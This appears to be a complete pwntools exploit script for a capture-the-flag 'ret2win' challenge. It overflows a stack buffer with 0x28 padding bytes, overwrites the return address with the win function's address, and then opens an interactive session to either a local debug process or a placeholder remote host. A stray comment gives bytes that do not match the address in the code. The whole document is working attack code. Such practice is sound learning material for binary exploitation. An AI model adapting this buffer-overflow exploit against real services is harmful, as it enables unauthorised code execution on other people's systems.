from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'kali-linux']

if args.LOCAL:
    p = gdb.debug('./ret2win')
    # p = process('./ret2win')
else:
    p = remote('addr', 0x1337)

win = 0x401186
payload = b'A' * 0x28 + p64(win) # \x56\x07\x40
p.recvuntil(b'something:')
p.sendline(payload)

p.interactive()

